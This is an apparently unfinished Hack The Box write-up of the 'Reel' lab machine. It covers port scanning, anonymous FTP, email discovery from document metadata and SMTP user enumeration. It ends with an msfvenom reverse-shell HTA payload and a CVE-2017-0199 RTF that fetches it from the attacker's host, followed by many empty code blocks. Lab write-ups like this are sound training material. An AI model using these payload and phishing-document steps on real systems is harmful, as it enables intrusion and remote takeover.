---
title: HTB-Reel Writeup
date: 2026-05-07T10:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - Writeup
  - HTB
---

```bash
┌──(kali㉿kali)-[~/Work/Kali/Reel]
└─$ sudo nmap --min-rate 10000 -p- 10.129.30.46 -oA Nmap/ports
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-06 22:33 -0400
Nmap scan report for 10.129.30.46
Host is up (0.088s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
25/tcp    open  smtp
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
593/tcp   open  http-rpc-epmap
49159/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 14.57 seconds
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Reel]
└─$ sudo nmap -sT -sC -sV -O -p 21,22,25,135,139,445,593,49159 10.129.30.46
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-06 22:36 -0400
Nmap scan report for 10.129.30.46
Host is up (0.087s latency).

PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_05-29-18  12:19AM       <DIR>          documents
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp    open  ssh          OpenSSH 7.6 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)
|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)
|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)
25/tcp    open  smtp?
| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe: 
|     220 Mail Service ready
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|   Hello: 
|     220 Mail Service ready
|     EHLO Invalid domain address.
|   Help: 
|     220 Mail Service ready
|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|   SIPOptions: 
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|   TerminalServerCookie: 
|     220 Mail Service ready
|_    sequence of commands
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: HTB)
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49159/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port25-TCP:V=7.98%I=7%D=5/6%Time=69FBFAB5%P=x86_64-pc-linux-gnu%r(NULL,
SF:18,"220\x20Mail\x20Service\x20ready\r\n")%r(Hello,3A,"220\x20Mail\x20Se
SF:rvice\x20ready\r\n501\x20EHLO\x20Invalid\x20domain\x20address\.\r\n")%r
SF:(Help,54,"220\x20Mail\x20Service\x20ready\r\n211\x20DATA\x20HELO\x20EHL
SF:O\x20MAIL\x20NOOP\x20QUIT\x20RCPT\x20RSET\x20SAML\x20TURN\x20VRFY\r\n")
SF:%r(GenericLines,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x20se
SF:quence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r\
SF:n")%r(GetRequest,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x20s
SF:equence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r
SF:\n")%r(HTTPOptions,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x2
SF:0sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands
SF:\r\n")%r(RTSPRequest,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\
SF:x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20comman
SF:ds\r\n")%r(RPCCheck,18,"220\x20Mail\x20Service\x20ready\r\n")%r(DNSVers
SF:ionBindReqTCP,18,"220\x20Mail\x20Service\x20ready\r\n")%r(DNSStatusRequ
SF:estTCP,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SSLSessionReq,18,"22
SF:0\x20Mail\x20Service\x20ready\r\n")%r(TerminalServerCookie,36,"220\x20M
SF:ail\x20Service\x20ready\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n
SF:")%r(TLSSessionReq,18,"220\x20Mail\x20Service\x20ready\r\n")%r(Kerberos
SF:,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SMBProgNeg,18,"220\x20Mail
SF:\x20Service\x20ready\r\n")%r(X11Probe,18,"220\x20Mail\x20Service\x20rea
SF:dy\r\n")%r(FourOhFourRequest,54,"220\x20Mail\x20Service\x20ready\r\n503
SF:\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x
SF:20commands\r\n")%r(LPDString,18,"220\x20Mail\x20Service\x20ready\r\n")%
SF:r(LDAPSearchReq,18,"220\x20Mail\x20Service\x20ready\r\n")%r(LDAPBindReq
SF:,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SIPOptions,162,"220\x20Mai
SF:l\x20Service\x20ready\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n50
SF:3\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\
SF:x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x
SF:20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20command
SF:s\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence
SF:\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\x
SF:20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20
SF:commands\r\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012|2008|7 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (97%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: REEL; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.0.2: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-05-07T02:39:24
|_  start_date: 2026-05-07T02:25:51
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_clock-skew: mean: -19m58s, deviation: 34m35s, median: -1s
| smb-os-discovery: 
|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
|   OS CPE: cpe:/o:microsoft:windows_server_2012::-
|   Computer name: REEL
|   NetBIOS computer name: REEL\x00
|   Domain name: HTB.LOCAL
|   Forest name: HTB.LOCAL
|   FQDN: REEL.HTB.LOCAL
|_  System time: 2026-05-07T03:39:26+01:00

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 214.74 seconds

```

21 端口允许匿名登录。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Reel]
└─$ ftp 10.129.30.46
Connected to 10.129.30.46.
220 Microsoft FTP Service
Name (10.129.30.46:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||41002|)
125 Data connection already open; Transfer starting.
05-29-18  12:19AM       <DIR>          documents
226 Transfer complete.
ftp> cd documents
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||41003|)
125 Data connection already open; Transfer starting.
05-29-18  12:19AM                 2047 AppLocker.docx
05-28-18  02:01PM                  124 readme.txt
10-31-17  10:13PM                14581 Windows Event Forwarding.docx
226 Transfer complete.
ftp> binary
200 Type set to I.
ftp> mget *
mget AppLocker.docx [anpqy?]? y
229 Entering Extended Passive Mode (|||41005|)
125 Data connection already open; Transfer starting.
100% |*****************************************************************************************************************************************************|  2047       25.22 KiB/s    00:00 ETA
226 Transfer complete.
2047 bytes received in 00:00 (24.82 KiB/s)
mget readme.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||41006|)
125 Data connection already open; Transfer starting.
100% |*****************************************************************************************************************************************************|   124        1.49 KiB/s    00:00 ETA
226 Transfer complete.
124 bytes received in 00:00 (1.46 KiB/s)
mget Windows Event Forwarding.docx [anpqy?]? y
229 Entering Extended Passive Mode (|||41007|)
125 Data connection already open; Transfer starting.
100% |*****************************************************************************************************************************************************| 14581       87.18 KiB/s    00:00 ETA
226 Transfer complete.
14581 bytes received in 00:00 (86.66 KiB/s)
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Reel]
└─$ ls -liah
total 36K
2794142 drwxrwxr-x  3 kali kali 4.0K May  6 22:44  .
2759041 drwxrwxr-x 15 kali kali 4.0K May  6 22:25  ..
2794155 -rw-rw-r--  1 kali kali 2.0K May 28  2018  AppLocker.docx
2794156 -rw-rw-r--  1 kali kali  124 May 28  2018  readme.txt
2794157 -rw-rw-r--  1 kali kali  15K Oct 31  2017 'Windows Event Forwarding.docx'
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Reel]                                    
└─$ exiftool AppLocker.docx Windows\ Event\ Forwarding.docx           
======== AppLocker.docx                                               
ExifTool Version Number         : 13.50                               
File Name                       : AppLocker.docx                      
Directory                       : .                                   
File Size                       : 2.0 kB                              
File Modification Date/Time     : 2018:05:28 19:19:48-04:00           
File Access Date/Time           : 2026:05:06 22:44:17-04:00           
File Inode Change Date/Time     : 2026:05:06 22:44:17-04:00           
File Permissions                : -rw-rw-r--                          
File Type                       : DOCX                                
File Type Extension             : docx                                
MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document                                                     
Zip Required Version            : 20                                  
Zip Bit Flag                    : 0x0008                              
Zip Compression                 : Deflated                            
Zip Modify Date                 : 2018:05:29 00:19:50                 
Zip CRC                         : 0x3cdd8b4f                          
Zip Compressed Size             : 166                                 
Zip Uncompressed Size           : 284 
Zip File Name                   : _rels/.rels                         
======== Windows Event Forwarding.docx                                
ExifTool Version Number         : 13.50                                        
File Name                       : Windows Event Forwarding.docx
Directory                       : .                                            
File Size                       : 15 kB                                        
File Modification Date/Time     : 2017:10:31 17:13:23-04:00
File Access Date/Time           : 2026:05:06 22:44:20-04:00
File Inode Change Date/Time     : 2026:05:06 22:44:20-04:00
File Permissions                : -rw-rw-r--                                   
File Type                       : DOCX                                         
File Type Extension             : docx                                         
MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document                                                     
Zip Required Version            : 20                                           
Zip Bit Flag                    : 0x0006                                       
Zip Compression                 : Deflated                                     
Zip Modify Date                 : 1980:01:01 00:00:00
Zip CRC                         : 0x82872409                                   
Zip Compressed Size             : 385                                          
Zip Uncompressed Size           : 1422                                         
Zip File Name                   : [Content_Types].xml
Creator                         : nico@megabank.com
Revision Number                 : 4                                            
Create Date                     : 2017:10:31 18:42:00Z
Modify Date                     : 2017:10:31 18:51:00Z
Template                        : Normal.dotm                                  
Total Edit Time                 : 5 minutes                                    
Pages                           : 2                                            
Words                           : 299                                          
Characters                      : 1709                                         
Application                     : Microsoft Office Word
Doc Security                    : None                                         
Lines                           : 14                                           
Paragraphs                      : 4                                            
Scale Crop                      : No                                           
Heading Pairs                   : Title, 1                                     
Titles Of Parts                 :                                              
Company                         :                                              
Links Up To Date                : No                                           
Characters With Spaces          : 2004                                         
Shared Doc                      : No                                           
Hyperlinks Changed              : No                                           
App Version                     : 14.0000                                      
    2 image files read
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Reel]
└─$ vim mail.txt     
                                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/Work/Kali/Reel]
└─$ cat mail.txt        
nico@megabank.com

```

![](Pasted%20image%2020260507105135.png)

![](Pasted%20image%2020260507105244.png)

![](Pasted%20image%2020260507105300.png)

```bash
┌──(kali㉿kali)-[~/Work/Kali/Reel]
└─$ telnet 10.129.30.46 25                     
Trying 10.129.30.46...
Connected to 10.129.30.46.
Escape character is '^]'.
220 Mail Service ready
HELO test
250 Hello.
MAIL FROM: <enil@admin.com>
250 OK
RCPT TO: <nico@megabank.com>
250 OK
RCPT TO: <administrator@megabank.com>
550 Unknown user
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Reel]
└─$ telnet 10.129.30.46 25                     
Trying 10.129.30.46...
Connected to 10.129.30.46.
Escape character is '^]'.
220 Mail Service ready
HELO test
250 Hello.
MAIL FROM: <enil@admin.com>
250 OK
RCPT TO: <nico@megabank.com>
250 OK
RCPT TO: <administrator@megabank.com>
550 Unknown user
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Reel/payload]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.58 LPORT=443 -f hta-psh -o enil.hta
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of hta-psh file: 7686 bytes
Saved as: enil.hta
                                                                                                        
┌──(kali㉿kali)-[~/Work/Kali/Reel/payload]
└─$ ls -liah
total 16K
2794162 drwxrwxr-x 2 kali kali 4.0K May  7 03:11 .
2794142 drwxrwxr-x 4 kali kali 4.0K May  7 03:07 ..
2767293 -rw-rw-r-- 1 kali kali 7.6K May  7 03:11 enil.hta

```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Reel/payload]
└─$ git clone https://github.com/bhdresh/CVE-2017-0199.git
Cloning into 'CVE-2017-0199'...
remote: Enumerating objects: 298, done.
remote: Total 298 (delta 0), reused 0 (delta 0), pack-reused 298 (from 1)
Receiving objects: 100% (298/298), 288.09 KiB | 6.26 MiB/s, done.
Resolving deltas: 100% (102/102), done.
                                                                                                        
┌──(kali㉿kali)-[~/Work/Kali/Reel/payload]
└─$ ls      
CVE-2017-0199  enil.hta
                                                                                                        
┌──(kali㉿kali)-[~/Work/Kali/Reel/payload]
└─$ cd CVE-2017-0199                
                                                                                                        
┌──(kali㉿kali)-[~/…/Kali/Reel/payload/CVE-2017-0199]
└─$ ls
cve-2017-0199_toolkit.py  README.md  template  TODO.txt
                                                                                                        
┌──(kali㉿kali)-[~/…/Kali/Reel/payload/CVE-2017-0199]
└─$ python2 cve-2017-0199_toolkit.py -M gen \
  -w applocker_procedure.rtf \
  -u http://10.10.16.58/enil.hta
Generating normal RTF payload.

Generated applocker_procedure.rtf successfully
```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```